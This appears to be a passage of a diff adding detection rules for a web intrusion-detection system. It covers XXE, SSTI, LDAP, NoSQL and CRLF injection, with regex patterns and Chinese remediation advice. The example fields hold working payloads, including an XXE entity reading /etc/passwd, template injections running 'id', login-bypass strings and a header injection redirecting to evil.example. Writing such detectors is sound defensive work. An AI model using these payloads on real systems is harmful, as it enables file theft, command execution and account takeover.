+      "remediation": "对 URL/图片处理类接口加频率限制与目标白名单；监控短时间内大量不同目标地址的请求（疑似内网探测）。",
+      "false_positive_hint": "可信度中等：批量导入/图片抓取业务可能正常高频，建议结合目标地址是否内网复核。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
+      ],
+      "examples": [
+        "60 秒内 20 次 ?url=http://10.0.0.{1..20}:80"
+      ]
+    },
+    {
+      "id": "WEB-XXE-001",
+      "category": "xxe",
+      "title": "XXE：DOCTYPE/ENTITY 声明注入",
+      "severity": "high",
+      "cvss": 8.6,
+      "confidence": "high",
+      "match_targets": [
+        "body",
+        "query",
+        "path"
+      ],
+      "patterns": [
+        "<!doctype[^>]{0,120}(system|public)",
+        "<!entity\\s+[a-z_][\\w-]{0,30}\\s+system",
+        "<!entity\\s+%\\s+[a-z_][\\w-]{0,30}",
+        "<!\\s*entity[^>]{0,120}>",
+        "xmlns:xi\\s*=\\s*[\"']http://www\\.w3\\.org/2001/xinclude"
+      ],
+      "remediation": "解析 XML 时禁用外部实体与 DTD（如 Java 的 disallow-doctype-decl=true、Python 的 defusedxml）；改用 JSON 等无实体格式；对入参做严格 schema 校验。",
+      "references": [
+        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing",
+        "https://cwe.mitre.org/data/definitions/611.html"
+      ],
+      "examples": [
+        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+      ]
+    },
+    {
+      "id": "WEB-XXE-002",
+      "category": "xxe",
+      "title": "XXE：外部实体协议与本地文件读取",
+      "severity": "critical",
+      "cvss": 9.1,
+      "confidence": "high",
+      "match_targets": [
+        "body",
+        "query"
+      ],
+      "patterns": [
+        "system\\s+[\"'](file|http|https|ftp|php|expect|gopher|jar|netdoc)://",
+        "<!entity[^>]{0,100}(file|http|expect)://",
+        "file:///(etc|proc|var|root|home|windows|c:)",
+        "public\\s+[\"'][^\"']{2,40}[\"']\\s+[\"'](file|http)://",
+        "&[a-z_][\\w-]{0,20};[^<]{0,10}</"
+      ],
+      "remediation": "禁用外部实体解析（这才是根因）；对已泄露的文件/凭据做轮换；限制 Web 进程可读文件范围。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/611.html"
+      ],
+      "examples": [
+        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+      ]
+    },
+    {
+      "id": "WEB-XXE-003",
+      "category": "xxe",
+      "title": "XXE：参数实体/盲注数据外带（OOB）",
+      "severity": "critical",
+      "cvss": 9.4,
+      "confidence": "high",
+      "dwva": "XXE",
+      "match_targets": [
+        "body"
+      ],
+      "patterns": [
+        "<!entity\\s+%\\s+[a-z_][\\w-]{0,30}\\s+system\\s+[\"']https?://",
+        "<!entity[^>]{0,120}(dnslog|ceye|collaborator|oast|burpcollaborator)",
+        "https?://[^\"'\\s>]{0,60}(dnslog|ceye\\.io|burpcollaborator|\\.oast\\.)",
+        "<!entity[^>]{0,60}%file;|<!entity[^>]{0,60}%remote;|<!entity[^>]{0,60}%param;",
+        "<!entity\\s+[a-z]+\\s+[\"']&[a-z]+;%[a-z]+;[\"']>"
+      ],
+      "remediation": "彻底关闭 DTD/外部实体；禁止应用服务器出网解析（出站白名单）；监控 DNS 出站用于外带数据的域名。",
+      "references": [
+        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing"
+      ],
+      "examples": [
+        "<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">"
+      ]
+    },
+    {
+      "id": "WEB-SSTI-001",
+      "category": "ssti",
+      "title": "SSTI：Jinja2/Twig 模板对象访问链",
+      "severity": "critical",
+      "cvss": 9.6,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "\\{\\{[^}]{0,120}(config|self|request|session|cycler|joiner|namespace|get_flashed_messages)\\b",
+        "\\{\\{[^}]{0,120}(_class|_mro|__subclasses__|__globals__|__builtins__|__import__|__init__)",
+        "\\{\\{[^}]{0,120}(os|subprocess|popen|system)\\s*[\\.\\(]",
+        "\\{%\\s*(import|include|extends|from)\\s+"
+      ],
+      "remediation": "模板与数据严格分离（禁止把用户输入当模板编译）；使用沙箱模板引擎并禁用危险过滤器/全局对象；参数白名单校验。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Server-Side_Template_Injection",
+        "https://cwe.mitre.org/data/definitions/1336.html"
+      ],
+      "examples": [
+        "?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+      ]
+    },
+    {
+      "id": "WEB-SSTI-002",
+      "category": "ssti",
+      "title": "SSTI：算术/字符串探测表达式（{7*7} 类）",
+      "severity": "medium",
+      "cvss": 6.5,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "\\{\\{\\s*\\d{1,5}\\s*[\\*\\+\\-\\/]{1}\\s*\\d{1,5}\\s*\\}\\}",
+        "\\{\\{\\s*[\"'][a-z]{1,10}[\"']\\s*[\\*\\+]\\s*\\d{1,4}\\s*\\}\\}",
+        "\\{\\{\\s*\\d{1,5}\\s*\\}\\}\\s*\\{\\{\\s*\\d{1,5}\\s*\\}\\}",
+        "\\{\\{[^}]{0,60}\\|\\s*(safe|attr|map|join|format|replace)\\b"
+      ],
+      "remediation": "同上：模板不作为代码求值；如需表达式求值，使用受限表达式语言 + 白名单变量。",
+      "false_positive_hint": "可信度中等：前端框架（Vue/Handlebars）会把 {{ }} 当插值，若接口直接返回模板片段可能误报，建议按接口加白。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Server-Side_Template_Injection"
+      ],
+      "examples": [
+        "?name={{7*7}}",
+        "?id={{1337*1337}}"
+      ]
+    },
+    {
+      "id": "WEB-SSTI-003",
+      "category": "ssti",
+      "title": "SSTI：其他引擎载荷（EL/Freemarker/ERB/OGNL）",
+      "severity": "critical",
+      "cvss": 9.2,
+      "confidence": "high",
+      "dwva": "SSTI",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "\\$\\{[^}]{0,120}(class|getclass|forname|runtime|getruntime|processbuilder|exec|system|process)",
+        "<#assign|<#list|\\$\\{[^}]{0,60}\\?\\w+\\(",
+        "#\\{[^}]{0,80}(exec|system|eval|popen)",
+        "<%=[^%]{0,80}(system|exec|eval|\\.getruntime)",
+        "\\*\\{[^}]{0,80}(exec|system|runtime)",
+        "\\{\\{[^}]{0,80}(exec|system|popen)\\s*\\("
+      ],
+      "remediation": "确认使用的模板/表达式引擎并关闭危险能力；Spring EL 场景限制 SpEL 求值来源；对含 ${}/#{} 的输入做转义。",
+      "references": [
+        "https://portswigger.net/web-security/server-side-template-injection"
+      ],
+      "examples": [
+        "?id=${T(java.lang.Runtime).getRuntime().exec('id')}",
+        "?tpl=<%= system('id') %>"
+      ]
+    },
+    {
+      "id": "WEB-LDAP-001",
+      "category": "ldap_nosql_injection",
+      "title": "LDAP 注入：永真过滤器构造",
+      "severity": "high",
+      "cvss": 8.2,
+      "confidence": "high",
+      "dwva": "LDAP Injection",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "\\)\\s*\\(\\s*(\\||&|cn|uid|userpassword|objectclass|samaccountname)\\s*[=\\)]",
+        "\\(\\s*(\\||&)\\s*\\([a-z]+\\s*=",
+        "(objectclass|cn|uid|userpassword)\\s*=\\s*\\*",
+        "\\*\\s*\\)\\s*\\(\\s*\\w+\\s*=",
+        "\\(&\\s*\\(\\w+\\s*=\\*"
+      ],
+      "remediation": "LDAP 查询使用参数化/转义（过滤 @&|!*() 等特殊字符）；认证失败时统一错误信息；对账号字段做白名单。",
+      "references": [
+        "https://owasp.org/www-community/attacks/LDAP_Injection",
+        "https://cwe.mitre.org/data/definitions/90.html"
+      ],
+      "examples": [
+        "?user=*)(uid=*))(|(uid=*&password=x"
+      ]
+    },
+    {
+      "id": "WEB-LDAP-002",
+      "category": "ldap_nosql_injection",
+      "title": "LDAP/认证查询：通配符绕过登录",
+      "severity": "high",
+      "cvss": 8,
+      "confidence": "medium",
+      "dwva": "LDAP Injection",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "threshold": {
+        "window_sec": 60,
+        "count": 3
+      },
+      "patterns": [
+        "(user|username|uid|account|mail)\\s*=\\s*\\*(&|$)",
+        "(password|pass|pwd)\\s*=\\s*\\*(&|$)",
+        "(user|username|uid)\\s*=\\s*[^&\\s]{0,30}\\*[^&\\s]{0,30}(&|$)",
+        "(binddn|dn|samaccountname)\\s*=\\s*[^&]{0,30}\\*"
+      ],
+      "remediation": "禁止把通配符与过滤语法字符直接带入查询；登录失败与账号不存在返回同一提示；增加失败锁定策略。",
+      "false_positive_hint": "可信度中等：LDAP 管理后台按通配符搜索用户是正常功能，请按来源与接口加白。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/90.html"
+      ],
+      "examples": [
+        "user=*&password=*",
+        "uid=admin*&password=x"
+      ]
+    },
+    {
+      "id": "WEB-NOSQL-001",
+      "category": "ldap_nosql_injection",
+      "title": "NoSQL 注入：MongoDB 操作符注入",
+      "severity": "high",
+      "cvss": 8.6,
+      "confidence": "high",
+      "dwva": "NoSQL Injection",
+      "match_targets": [
+        "query",
+        "body",
+        "header"
+      ],
+      "patterns": [
+        "\\{\\s*[\"']?\\$(ne|gt|gte|lt|lte|regex|exists|where|in|nin|or|and|expr|jsonSchema)[\"']?\\s*:",
+        "[\"'][\\w]+[\"']\\s*:\\s*\\{\\s*[\"']?\\$(ne|regex|gt|where)",
+        "\\$(where|regex|ne|gt)\\b\\s*[=:]",
+        "(user(name)?|pass(word)?)\\[\\$(ne|gt|regex|exists)\\]\\s*=",
+        "\\$where\\s*:\\s*[\"']?(this|function|sleep|return)"
+      ],
+      "remediation": "对查询对象做结构与类型校验（拒绝对象/数组进入字符串字段）；使用 ODM 的参数化查询；数据库账号最小权限并关闭 $where。",
+      "references": [
+        "https://owasp.org/www-community/attacks/NoSQL_Injection",
+        "https://cwe.mitre.org/data/definitions/943.html"
+      ],
+      "examples": [
+        "username[$ne]=x&password[$ne]=x",
+        "{\"username\":{\"$gt\":\"\"}}"
+      ]
+    },
+    {
+      "id": "WEB-CRLF-001",
+      "category": "crlf_injection",
+      "title": "CRLF 注入：响应头拆分（编码特征检测）",
+      "severity": "medium",
+      "cvss": 6.1,
+      "confidence": "high",
+      "dwva": "CRLF Injection",
+      "match_targets": [
+        "query",
+        "body",
+        "path"
+      ],
+      "match_mode": "raw",
+      "patterns": [
+        "(%0d|%0a){1,2}\\s*(set-cookie|location|refresh|content-length|access-control-allow-origin)\\s*[:=]",
+        "(%0d%0a|%0a%0d|%0d|%0a)(%0d%0a)?\\s*(https?://|//)",
+        "%0d%0a%0d%0a",
+        "(%250d%250a|%2520)",
+        "\\r\\n(set-cookie|location|refresh)\\s*:"
+      ],
+      "remediation": "对进入响应头的参数做 CR/LF 过滤与编码；使用框架提供的 header API（自动转义）；禁止把用户输入拼进 Location/Set-Cookie。",
+      "references": [
+        "https://owasp.org/www-community/attacks/HTTP_Response_Splitting",
+        "https://cwe.mitre.org/data/definitions/93.html"
+      ],
+      "examples": [
+        "?url=%0d%0aSet-Cookie:admin=1",
+        "?next=%0d%0aLocation:https://evil.example/"
+      ]
+    },
+    {
+      "id": "WEB-CRLF-002",
+      "category": "crlf_injection",
+      "title": "CRLF 注入：注入自定义响应头/伪协议跳转",
+      "severity": "medium",
+      "cvss": 5.8,
+      "confidence": "medium",
+      "dwva": "CRLF Injection",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(%0d%0a|%0a|%0d)\\s*(x-forwarded|host|content-type|content-security-policy|pragma)\\s*:",
+        "(%0d%0a|%0a)\\s*refresh\\s*:\\s*0\\s*;\\s*url=",
+        "(location|refresh|redirect)\\s*=\\s*https?://",
+        "(%0d%0a|%0a)\\s*(javascript|vbscript)\\s*:",
+        "(%0d%0a|%0a)\\s*<\\s*(script|html)"
+      ],
+      "remediation": "同 CRLF 注入修复；重定向目标改为服务端白名单映射；响应头统一由框架生成。",
+      "false_positive_hint": "可信度中等：日志/文本正文里出现 %0a 与头字段组合可能误报，建议按接口加白。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/93.html"
+      ],
+      "examples": [
+        "?lang=en%20HTTP/1.1%0d%0aX-Injected:1"
+      ]
+    }
+  ]
+}
